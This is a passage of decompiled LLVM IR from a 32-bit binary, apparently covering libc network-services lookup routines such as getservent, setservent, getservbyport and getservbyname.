dec_label_pc_80646ba:                             ; preds = %dec_label_pc_80646a6
  %v1_80646ba = inttoptr i32 %v3_80646ae to i8*
  store i8 0, i8* %v1_80646ba, align 1
  %v0_80646bd = load i32, i32* @ebx, align 4
  %v1_80646bd = load i32, i32* @edi, align 4
  %v2_80646bd = inttoptr i32 %v1_80646bd to i32*
  store i32 %v0_80646bd, i32* %v2_80646bd, align 4
  %v0_80646c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80646c6, i32* %stack_var_-60, align 4
  %v2_80646c7 = inttoptr i32 %v0_80646c6 to i8*
  %v3_80646c7 = call i32 @__GI_strpbrk(i8* %v2_80646c7, i32 ptrtoint ([3 x i8]* @global_var_806e719.876 to i32))
  store i32 %v3_80646c7, i32* %eax.global-to-local, align 4
  %v1_80646cf = icmp eq i32 %v3_80646c7, 0
  br i1 %v1_80646cf, label %dec_label_pc_8064683.backedge, label %dec_label_pc_80646d3

dec_label_pc_80646d3:                             ; preds = %dec_label_pc_80646ba
  %v1_80646d3 = add i32 %v3_80646c7, 1
  store i32 %v1_80646d3, i32* @esi, align 4
  %v1_80646d6 = inttoptr i32 %v3_80646c7 to i8*
  store i8 0, i8* %v1_80646d6, align 1
  %v0_80646dc.pre = load i32, i32* @esi, align 4
  %v4_80646dc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80646dc

dec_label_pc_80646db:                             ; preds = %dec_label_pc_80646e2, %dec_label_pc_80646dc
  %v1_80646db = add i32 %v0_80646db, 1
  store i32 %v1_80646db, i32* @esi, align 4
  br label %dec_label_pc_80646dc

dec_label_pc_80646dc:                             ; preds = %dec_label_pc_80646d3, %dec_label_pc_80646db
  %v4_80646dc = phi i32 [ %v4_80646dc.pre, %dec_label_pc_80646d3 ], [ %v6_80646dc, %dec_label_pc_80646db ]
  %v0_80646db = phi i32 [ %v0_80646dc.pre, %dec_label_pc_80646d3 ], [ %v1_80646db, %dec_label_pc_80646db ]
  %v1_80646dc = inttoptr i32 %v0_80646db to i8*
  %v2_80646dc = load i8, i8* %v1_80646dc, align 1
  %v3_80646dc = zext i8 %v2_80646dc to i32
  %v5_80646dc = and i32 %v4_80646dc, -256
  %v6_80646dc = or i32 %v3_80646dc, %v5_80646dc
  store i32 %v6_80646dc, i32* %eax.global-to-local, align 4
  %v7_80646de = icmp eq i8 %v2_80646dc, 32
  br i1 %v7_80646de, label %dec_label_pc_80646db, label %dec_label_pc_80646e2

dec_label_pc_80646e2:                             ; preds = %dec_label_pc_80646dc
  %v10_80646e2 = icmp eq i8 %v2_80646dc, 9
  br i1 %v10_80646e2, label %dec_label_pc_80646db, label %dec_label_pc_80646e6

dec_label_pc_80646e6:                             ; preds = %dec_label_pc_80646e2
  store i32 %v0_80646db, i32* %stack_var_-60, align 4
  %v3_80646ee = call i32 @__GI_strpbrk(i8* %v1_80646dc, i32 ptrtoint ([3 x i8]* @global_var_806e71c.877 to i32))
  store i32 %v3_80646ee, i32* %eax.global-to-local, align 4
  %v1_80646f6 = icmp eq i32 %v3_80646ee, 0
  br i1 %v1_80646f6, label %dec_label_pc_8064683.backedge, label %dec_label_pc_80646fa

dec_label_pc_80646fa:                             ; preds = %dec_label_pc_80646e6
  %v1_80646fd = inttoptr i32 %v3_80646ee to i8*
  store i8 0, i8* %v1_80646fd, align 1
  %v0_8064700 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064700 = add i32 %v0_8064700, 1
  store i32 %v1_8064700, i32* @ebx, align 4
  %v0_8064703 = load i32, i32* @esi, align 4
  store i32 %v0_8064703, i32* %stack_var_-60, align 4
  %v1_8064704 = call i32 @atol(i32 %v0_8064703)
  %v1_8064709 = trunc i32 %v1_8064704 to i16
  %v2_8064709 = call i16 @llvm.bswap.i16(i16 %v1_8064709)
  %v3_8064709 = zext i16 %v2_8064709 to i32
  store i32 %v3_8064709, i32* %eax.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806e71c.877 to i32), i32* %edx.global-to-local, align 4
  %v1_8064712 = load i32, i32* @edi, align 4
  %v2_8064712 = add i32 %v1_8064712, 8
  %v3_8064712 = inttoptr i32 %v2_8064712 to i32*
  store i32 %v3_8064709, i32* %v3_8064712, align 4
  %v0_8064715 = load i32, i32* @ebx, align 4
  %v1_8064715 = load i32, i32* @edi, align 4
  %v2_8064715 = add i32 %v1_8064715, 12
  %v3_8064715 = inttoptr i32 %v2_8064715 to i32*
  store i32 %v0_8064715, i32* %v3_8064715, align 4
  %v0_8064718 = load i32, i32* @ebp, align 4
  %v1_8064718 = load i32, i32* @edi, align 4
  %v2_8064718 = add i32 %v1_8064718, 4
  %v3_8064718 = inttoptr i32 %v2_8064718 to i32*
  store i32 %v0_8064718, i32* %v3_8064718, align 4
  %v0_806471b = load i32, i32* @ebp, align 4
  store i32 %v0_806471b, i32* @esi, align 4
  %v0_8064722 = load i32, i32* @ebx, align 4
  store i32 %v0_8064722, i32* %stack_var_-60, align 4
  %v2_8064723 = inttoptr i32 %v0_8064722 to i8*
  %v3_8064723 = call i32 @__GI_strpbrk(i8* %v2_8064723, i32 ptrtoint ([3 x i8]* @global_var_806e719.876 to i32))
  store i32 %v3_8064723, i32* %eax.global-to-local, align 4
  store i32 %v3_8064723, i32* %edx.global-to-local, align 4
  %v1_806475334 = icmp eq i32 %v3_8064723, 0
  br i1 %v1_806475334, label %dec_label_pc_8064765, label %dec_label_pc_8064757

dec_label_pc_806472a:                             ; preds = %dec_label_pc_806475f
  %v7_806472a = icmp eq i8 %v2_806475f, 32
  br i1 %v7_806472a, label %dec_label_pc_806475a.backedge, label %dec_label_pc_806472e

dec_label_pc_806475a.backedge:                    ; preds = %dec_label_pc_806472a, %dec_label_pc_806472e
  %v1_806475a = add i32 %v1_806475a33, 1
  %v8_806475a = icmp eq i32 %v1_806475a, 0
  store i32 %v1_806475a, i32* %edx.global-to-local, align 4
  br i1 %v8_806475a, label %dec_label_pc_8064765, label %dec_label_pc_806475f

dec_label_pc_806472e:                             ; preds = %dec_label_pc_806472a
  %v10_806472e = icmp eq i8 %v2_806475f, 9
  br i1 %v10_806472e, label %dec_label_pc_806475a.backedge, label %dec_label_pc_8064732

dec_label_pc_8064732:                             ; preds = %dec_label_pc_806472e
  %v0_8064732 = load i32, i32* @ebp, align 4
  %v1_8064732 = add i32 %v0_8064732, 136
  store i32 %v1_8064732, i32* %eax.global-to-local, align 4
  %v0_8064738 = load i32, i32* @esi, align 4
  %v7_8064738 = icmp ult i32 %v0_8064738, %v1_8064732
  %v1_806473a = icmp eq i1 %v7_8064738, false
  br i1 %v1_806473a, label %dec_label_pc_8064741, label %dec_label_pc_806473c

dec_label_pc_806473c:                             ; preds = %dec_label_pc_8064732
  %v2_806473c = inttoptr i32 %v0_8064738 to i32*
  store i32 %v1_806475a33, i32* %v2_806473c, align 4
  %v0_806473e = load i32, i32* @esi, align 4
  %v1_806473e = add i32 %v0_806473e, 4
  store i32 %v1_806473e, i32* @esi, align 4
  %v0_8064748.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064741

dec_label_pc_8064741:                             ; preds = %dec_label_pc_8064732, %dec_label_pc_806473c
  %v0_8064748 = phi i32 [ %v1_806475a33, %dec_label_pc_8064732 ], [ %v0_8064748.pre, %dec_label_pc_806473c ]
  store i32 %v0_8064748, i32* %stack_var_-60, align 4
  %v2_8064749 = inttoptr i32 %v0_8064748 to i8*
  %v3_8064749 = call i32 @__GI_strpbrk(i8* %v2_8064749, i32 ptrtoint ([3 x i8]* @global_var_806e719.876 to i32))
  store i32 %v3_8064749, i32* %eax.global-to-local, align 4
  store i32 %v3_8064749, i32* %edx.global-to-local, align 4
  %v1_8064753 = icmp eq i32 %v3_8064749, 0
  br i1 %v1_8064753, label %dec_label_pc_8064765, label %dec_label_pc_8064757

dec_label_pc_8064757:                             ; preds = %dec_label_pc_80646fa, %dec_label_pc_8064741
  %v0_806475735 = phi i32 [ %v3_8064749, %dec_label_pc_8064741 ], [ %v3_8064723, %dec_label_pc_80646fa ]
  %v1_8064757 = inttoptr i32 %v0_806475735 to i8*
  store i8 0, i8* %v1_8064757, align 1
  %v0_806475a.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_806475a31 = add i32 %v0_806475a.pre, 1
  %v8_806475a32 = icmp eq i32 %v1_806475a31, 0
  store i32 %v1_806475a31, i32* %edx.global-to-local, align 4
  br i1 %v8_806475a32, label %dec_label_pc_8064765, label %dec_label_pc_806475f.lr.ph

dec_label_pc_806475f.lr.ph:                       ; preds = %dec_label_pc_8064757
  %v4_806475f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806475f

dec_label_pc_806475f:                             ; preds = %dec_label_pc_806475f.lr.ph, %dec_label_pc_806475a.backedge
  %v4_806475f = phi i32 [ %v4_806475f.pre, %dec_label_pc_806475f.lr.ph ], [ %v6_806475f, %dec_label_pc_806475a.backedge ]
  %v1_806475a33 = phi i32 [ %v1_806475a31, %dec_label_pc_806475f.lr.ph ], [ %v1_806475a, %dec_label_pc_806475a.backedge ]
  %v1_806475f = inttoptr i32 %v1_806475a33 to i8*
  %v2_806475f = load i8, i8* %v1_806475f, align 1
  %v3_806475f = zext i8 %v2_806475f to i32
  %v5_806475f = and i32 %v4_806475f, -256
  %v6_806475f = or i32 %v5_806475f, %v3_806475f
  store i32 %v6_806475f, i32* %eax.global-to-local, align 4
  %v4_8064761 = icmp eq i8 %v2_806475f, 0
  %v1_8064763 = icmp eq i1 %v4_8064761, false
  br i1 %v1_8064763, label %dec_label_pc_806472a, label %dec_label_pc_8064765

dec_label_pc_8064765:                             ; preds = %dec_label_pc_80646fa, %dec_label_pc_8064741, %dec_label_pc_8064757, %dec_label_pc_806475a.backedge, %dec_label_pc_806475f
  %v0_8064765 = load i32, i32* @esi, align 4
  %v1_8064765 = inttoptr i32 %v0_8064765 to i32*
  store i32 0, i32* %v1_8064765, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v0_8064771 = load i32, i32* @edi, align 4
  store i32 %v0_8064771, i32* %v1_80645db, align 4
  br label %dec_label_pc_8064773

dec_label_pc_8064773:                             ; preds = %dec_label_pc_806466e, %dec_label_pc_8064633, %dec_label_pc_8064765
  store i32 %v2_8064603, i32* %eax.global-to-local, align 4
  store i32 %v2_8064603, i32* %stack_var_-60, align 4
  %v3_806477c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_806477c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064784

dec_label_pc_8064784:                             ; preds = %dec_label_pc_80645e3, %dec_label_pc_8064773
  %v0_8064787 = load i32, i32* @ebx, align 4
  store i32 %v0_8064787, i32* %eax.global-to-local, align 4
  store i32 %v0_80645c1, i32* @ebx, align 4
  store i32 %v0_80645c0, i32* @esi, align 4
  store i32 %v0_80645bf, i32* @edi, align 4
  store i32 %v0_80645be, i32* @ebp, align 4
  ret i32 %v0_8064787

; uselistorder directives
  uselistorder i32 %v6_806475f, { 1, 0 }
  uselistorder i8 %v2_806475f, { 2, 3, 1, 0 }
  uselistorder i32 %v1_806475a33, { 3, 2, 1, 0 }
  uselistorder i32 %v3_8064749, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8064748, { 1, 0 }
  uselistorder i32 %v6_80646dc, { 1, 0 }
  uselistorder i32 %v0_80646db, { 0, 2, 1 }
  uselistorder i32 %v3_80646c7, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8064693, { 2, 1, 3, 0 }
  uselistorder i32 %v3_806469338, { 1, 0 }
  uselistorder i32 %v2_806465d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8064619, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 0, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 1, 3, 0, 6, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 5, 22, 21, 4, 23, 6, 7, 8, 9, 10, 11, 12, 13, 14, 24, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @atol, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 50, 49, 48, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 9, { 0, 1, 3, 2 }
  uselistorder i32 140, { 3, 0, 2, 1 }
  uselistorder i32 %arg4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064784, { 1, 0 }
  uselistorder label %dec_label_pc_8064773, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064765, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8064757, { 1, 0 }
  uselistorder label %dec_label_pc_8064741, { 1, 0 }
  uselistorder label %dec_label_pc_806475a.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80646dc, { 1, 0 }
  uselistorder label %dec_label_pc_8064683.backedge, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80646a1, { 1, 0 }
  uselistorder label %dec_label_pc_806466e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8064683.preheader, { 1, 0 }
}

define i32 @getservent() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8064791 = call i32 @__initbuf()
  %v2_8064796 = ptrtoint i32* %stack_var_-4 to i32
  %v0_80647a0 = load i32, i32* @global_var_807ca00.870, align 512
  %v5_80647ab = call i32 @getservent_r(i32* nonnull @global_var_807ca08.878, i32 %v0_80647a0, i32 4237, i32 %v2_8064796)
  %v3_80647b0 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_80647b0
}

define i32 @__GI_endservent() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80647b8 = load i32, i32* @ebx, align 4
  store i32 %v0_80647b8, i32* %stack_var_-4, align 4
  %v2_80647c6 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80647c6, i32* @ebx, align 4
  %v4_80647cb = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134583465, i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v1_80647d7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v0_80647dc = load i32, i32* @global_var_807ca04.872, align 4
  %v1_80647e4 = icmp eq i32 %v0_80647dc, 0
  br i1 %v1_80647e4, label %dec_label_pc_80647fe, label %dec_label_pc_80647e8

dec_label_pc_80647e8:                             ; preds = %entry
  %v1_80647ec = inttoptr i32 %v0_80647dc to i16*
  %v2_80647ec = call i32 @__GI_fclose(i16* %v1_80647ec)
  store i32 0, i32* @global_var_807ca04.872, align 4
  br label %dec_label_pc_80647fe

dec_label_pc_80647fe:                             ; preds = %entry, %dec_label_pc_80647e8
  store i8 0, i8* @global_var_807ca18.879, align 8
  %v3_806480a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_8064812 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8064812, i32* @ebx, align 4
  ret i32 %v3_806480a

; uselistorder directives
  uselistorder label %dec_label_pc_80647fe, { 1, 0 }
}

define i32 @setservent(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v4_8064826 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-16, i32 134583465, i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v1_8064832 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v0_8064837 = load i32, i32* @global_var_807ca04.872, align 4
  store i32 %v0_8064837, i32* @eax, align 4
  %v1_806483f = icmp eq i32 %v0_8064837, 0
  %v1_8064841 = icmp eq i1 %v1_806483f, false
  br i1 %v1_8064841, label %dec_label_pc_806485b, label %dec_label_pc_8064843

dec_label_pc_8064843:                             ; preds = %entry
  %v2_806484f = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_806e708.874 to i32), i32 ptrtoint (i32* @global_var_806e751.873 to i32))
  store i32 %v2_806484f, i32* @global_var_807ca04.872, align 4
  br label %dec_label_pc_8064864

dec_label_pc_806485b:                             ; preds = %entry
  %v1_806485f = inttoptr i32 %v0_8064837 to i16*
  %v2_806485f = call i32 @__GI_rewind(i16* %v1_806485f)
  br label %dec_label_pc_8064864

dec_label_pc_8064864:                             ; preds = %dec_label_pc_8064843, %dec_label_pc_806485b
  %v4_8064867 = icmp eq i32 %arg1, 0
  br i1 %v4_8064867, label %dec_label_pc_8064875, label %dec_label_pc_806486e

dec_label_pc_806486e:                             ; preds = %dec_label_pc_8064864
  store i8 1, i8* @global_var_807ca18.879, align 8
  br label %dec_label_pc_8064875

dec_label_pc_8064875:                             ; preds = %dec_label_pc_8064864, %dec_label_pc_806486e
  %v3_806487e = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-16, i32 1)
  ret i32 %v3_806487e

; uselistorder directives
  uselistorder i32* @global_var_807ca04.872, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_8064875, { 1, 0 }
  uselistorder label %dec_label_pc_8064864, { 1, 0 }
}

define i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg6 to i32
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %tmp4, i32* @ebp, align 4
  %v4_80648a9 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v1_80648b5 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v0_80648ba = load i8, i8* @global_var_807ca18.879, align 8
  %v1_80648ba = sext i8 %v0_80648ba to i32
  %v1_80648c4 = call i32 @setservent(i32 %v1_80648ba)
  %v1_80648d7 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_80648ed

dec_label_pc_80648ce:                             ; preds = %dec_label_pc_80648ed
  store i32 %arg1, i32* @eax, align 4
  %v0_80648d2 = load i32, i32* @esi, align 4
  %v1_80648d2 = add i32 %v0_80648d2, 8
  %v2_80648d2 = inttoptr i32 %v1_80648d2 to i32*
  %v3_80648d2 = load i32, i32* %v2_80648d2, align 4
  %v15_80648d2 = icmp eq i32 %v3_80648d2, %arg1
  %v1_80648d5 = icmp eq i1 %v15_80648d2, false
  br i1 %v1_80648d5, label %dec_label_pc_80648ed, label %dec_label_pc_80648d7

dec_label_pc_80648d7:                             ; preds = %dec_label_pc_80648ce
  br i1 %v1_80648d7, label %dec_label_pc_8064905, label %dec_label_pc_80648db

dec_label_pc_80648db:                             ; preds = %dec_label_pc_80648d7
  %v1_80648de = add i32 %v0_80648d2, 12
  %v2_80648de = inttoptr i32 %v1_80648de to i32*
  %v3_80648de = load i32, i32* %v2_80648de, align 4
  %v3_80648e1 = inttoptr i32 %v3_80648de to i8*
  %v4_80648e1 = call i32 @__GI_strcoll(i8* %v3_80648e1)
  %v1_80648e9 = icmp eq i32 %v4_80648e1, 0
  br i1 %v1_80648e9, label %dec_label_pc_8064905, label %dec_label_pc_80648ed

dec_label_pc_80648ed:                             ; preds = %dec_label_pc_80648db, %dec_label_pc_80648ce, %entry
  %v0_80648ed = load i32, i32* @ebp, align 4
  %v0_80648f6 = load i32, i32* @esi, align 4
  %v4_80648f7 = inttoptr i32 %v0_80648f6 to i32*
  %v5_80648f7 = call i32 @getservent_r(i32* %v4_80648f7, i32 %arg4, i32 %arg5, i32 %v0_80648ed)
  store i32 %v5_80648f7, i32* @ebx, align 4
  %v1_8064901 = icmp eq i32 %v5_80648f7, 0
  br i1 %v1_8064901, label %dec_label_pc_80648ce, label %dec_label_pc_8064905

dec_label_pc_8064905:                             ; preds = %dec_label_pc_80648db, %dec_label_pc_80648d7, %dec_label_pc_80648ed
  %v0_8064905 = load i8, i8* @global_var_807ca18.879, align 8
  %v1_8064905 = icmp eq i8 %v0_8064905, 0
  %v1_806490c = icmp eq i1 %v1_8064905, false
  br i1 %v1_806490c, label %dec_label_pc_8064913, label %dec_label_pc_806490e

dec_label_pc_806490e:                             ; preds = %dec_label_pc_8064905
  %v0_806490e = call i32 @__GI_endservent()
  br label %dec_label_pc_8064913

dec_label_pc_8064913:                             ; preds = %dec_label_pc_8064905, %dec_label_pc_806490e
  %v3_806491c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_8064923 = load i32, i32* @ebp, align 4
  %v1_8064923 = inttoptr i32 %v0_8064923 to i32*
  %v2_8064923 = load i32, i32* %v1_8064923, align 4
  %v3_8064923 = icmp eq i32 %v2_8064923, 0
  %v1_806492f = load i32, i32* @ebx, align 4
  %v2_806492f = select i1 %v3_8064923, i32 %v1_806492f, i32 0
  ret i32 %v2_806492f

; uselistorder directives
  uselistorder i32 %v5_80648f7, { 1, 0 }
  uselistorder label %dec_label_pc_8064913, { 1, 0 }
  uselistorder label %dec_label_pc_8064905, { 2, 0, 1 }
}

define i32 @__GI_getservbyport(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8064939 = call i32 @__initbuf()
  %v0_806494a = load i32, i32* @global_var_807ca00.870, align 512
  %v9_806495d = call i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 ptrtoint (i32* @global_var_807ca08.878 to i32), i32 %v0_806494a, i32 4237, i32* nonnull %stack_var_-4, i32 %v0_8064939, i32 %v0_8064939)
  %v3_8064962 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8064962

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getservbyname_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %tmp19 = ptrtoint i32* %arg3 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806496a = load i32, i32* @ebp, align 4
  %v0_806496b = load i32, i32* @edi, align 4
  %v0_806496c = load i32, i32* @esi, align 4
  %v0_806496d = load i32, i32* @ebx, align 4
  store i32 %v0_806496d, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %tmp19, i32* @esi, align 4
  %v4_8064988 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v1_8064994 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ff0.871 to i32))
  %v0_8064999 = load i8, i8* @global_var_807ca18.879, align 8
  %v1_8064999 = sext i8 %v0_8064999 to i32
  %v1_80649a3 = call i32 @setservent(i32 %v1_8064999)
  %v3_80649b5 = inttoptr i32 %arg1 to i8*
  %v1_80649e4 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_80649fa

dec_label_pc_80649ad:                             ; preds = %dec_label_pc_80649fa
  %v4_80649b5 = call i32 @__GI_strcoll(i8* %v3_80649b5)
  store i32 %v4_80649b5, i32* @eax, align 4
  %v1_80649bd = icmp eq i32 %v4_80649b5, 0
  br i1 %v1_80649bd, label %dec_label_pc_80649e4, label %dec_label_pc_80649c1

dec_label_pc_80649c1:                             ; preds = %dec_label_pc_80649ad
  %v0_80649c1 = load i32, i32* @esi, align 4
  %v1_80649c1 = add i32 %v0_80649c1, 4
  %v2_80649c1 = inttoptr i32 %v1_80649c1 to i32*
  %v3_80649c1 = load i32, i32* %v2_80649c1, align 4
  store i32 %v3_80649c1, i32* @ebx, align 4
  %v1_80649dc1 = inttoptr i32 %v3_80649c1 to i32*
  %v2_80649dc2 = load i32, i32* %v1_80649dc1, align 4
  store i32 %v2_80649dc2, i32* @eax, align 4
  %v1_80649de3 = icmp eq i32 %v2_80649dc2, 0
  %v1_80649e010 = icmp eq i1 %v1_80649de3, false
  br i1 %v1_80649e010, label %dec_label_pc_80649c6, label %dec_label_pc_80649fa

dec_label_pc_80649c6:                             ; preds = %dec_label_pc_80649c1, %dec_label_pc_80649d9
  %v4_80649cd = call i32 @__GI_strcoll(i8* %v3_80649b5)
  store i32 %v4_80649cd, i32* @eax, align 4
  %v1_80649d5 = icmp eq i32 %v4_80649cd, 0
  br i1 %v1_80649d5, label %dec_label_pc_80649e4, label %dec_label_pc_80649d9

dec_label_pc_80649d9:                             ; preds = %dec_label_pc_80649c6
  %v0_80649d9 = load i32, i32* @ebx, align 4
  %v1_80649d9 = add i32 %v0_80649d9, 4
  store i32 %v1_80649d9, i32* @ebx, align 4
  %v1_80649dc = inttoptr i32 %v1_80649d9 to i32*
  %v2_80649dc = load i32, i32* %v1_80649dc, align 4
  store i32 %v2_80649dc, i32* @eax, align 4
  %v1_80649de = icmp eq i32 %v2_80649dc, 0
  %v1_80649e0 = icmp eq i1 %v1_80649de, false
  br i1 %v1_80649e0, label %dec_label_pc_80649c6, label %dec_label_pc_80649fa

dec_label_pc_80649e4:                             ; preds = %dec_label_pc_80649c6, %dec_label_pc_80649ad
  br i1 %v1_80649e4, label %dec_label_pc_8064a15, label %dec_label_pc_80649e8

dec_label_pc_80649e8:                             ; preds = %dec_label_pc_80649e4
  %v0_80649eb = load i32, i32* @esi, align 4
  %v1_80649eb = add i32 %v0_80649eb, 12
  %v2_80649eb = inttoptr i32 %v1_80649eb to i32*
  %v3_80649eb = load i32, i32* %v2_80649eb, align 4
  %v3_80649ee = inttoptr i32 %v3_80649eb to i8*
  %v4_80649ee = call i32 @__GI_strcoll(i8* %v3_80649ee)
  %v1_80649f6 = icmp eq i32 %v4_80649ee, 0
  br i1 %v1_80649f6, label %dec_label_pc_8064a15, label %dec_label_pc_80649fa

dec_label_pc_80649fa:                             ; preds = %dec_label_pc_80649d9, %dec_label_pc_80649c1, %dec_label_pc_80649e8, %entry
  %v0_8064a06 = load i32, i32* @esi, align 4
  %v4_8064a07 = inttoptr i32 %v0_8064a06 to i32*
  %v5_8064a07 = call i32 @getservent_r(i32* %v4_8064a07, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v5_8064a07, i32* @eax, align 4
  store i32 %v5_8064a07, i32* @edi, align 4
  %v1_8064a11 = icmp eq i32 %v5_8064a07, 0
  br i1 %v1_8064a11, label %dec_label_pc_80649ad, label %dec_label_pc_8064a15

dec_label_pc_8064a15:                             ; preds = %dec_label_pc_80649e8, %dec_label_pc_80649e4, %dec_label_pc_80649fa
  %v0_8064a15 = load i8, i8* @global_var_807ca18.879, align 8
  %v1_8064a15 = icmp eq i8 %v0_8064a15, 0
  %v1_8064a1c = icmp eq i1 %v1_8064a15, false
  br i1 %v1_8064a1c, label %dec_label_pc_8064a23, label %dec_label_pc_8064a1e

dec_label_pc_8064a1e:                             ; preds = %dec_label_pc_8064a15
  %v0_8064a1e = call i32 @__GI_endservent()
  br label %dec_label_pc_8064a23

dec_label_pc_8064a23:                             ; preds = %dec_label_pc_8064a15, %dec_label_pc_8064a1e
  %v3_8064a2c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v1_8064a35 = inttoptr i32 %arg6 to i32*
  %v2_8064a35 = load i32, i32* %v1_8064a35, align 4
  %v3_8064a35 = icmp eq i32 %v2_8064a35, 0
  %v1_8064a43 = load i32, i32* @edi, align 4
  %v2_8064a43 = select i1 %v3_8064a35, i32 %v1_8064a43, i32 0
  %v2_8064a45 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064a45, i32* @ebx, align 4
  store i32 %v0_806496c, i32* @esi, align 4
  store i32 %v0_806496b, i32* @edi, align 4
  store i32 %v0_806496a, i32* @ebp, align 4
  ret i32 %v2_8064a43

; uselistorder directives
  uselistorder i32 %v5_8064a07, { 1, 0, 2 }
  uselistorder i32 %v1_80649d9, { 1, 0 }
  uselistorder i32 ()* @__GI_endservent, { 1, 0 }
  uselistorder i32 (i32)* @setservent, { 1, 0 }
  uselistorder i8* @global_var_807ca18.879, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8073ff0.871 to i32), { 5, 0, 6, 1, 7, 2, 8, 3, 9, 10, 4 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_8064a23, { 1, 0 }
  uselistorder label %dec_label_pc_8064a15, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80649fa, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80649c6, { 1, 0 }
}

define i32 @getservbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8064a4d = call i32 @__initbuf()
  %v2_8064a54 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8064a5e = load i32, i32* @global_var_807ca00.870, align 512
  %v9_8064a71 = call i32 @getservbyname_r(i32 %arg1, i32 %arg2, i32* nonnull @global_var_807ca08.878, i32 %v0_8064a5e, i32 4237, i32 %v2_8064a54, i32 %v0_8064a4d, i32 %v0_8064a4d)
  %v3_8064a76 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8064a76

; uselistorder directives
  uselistorder i32 (i32, i32, i32*, i32, i32, i32, i32, i32)* @getservbyname_r, { 1, 0 }
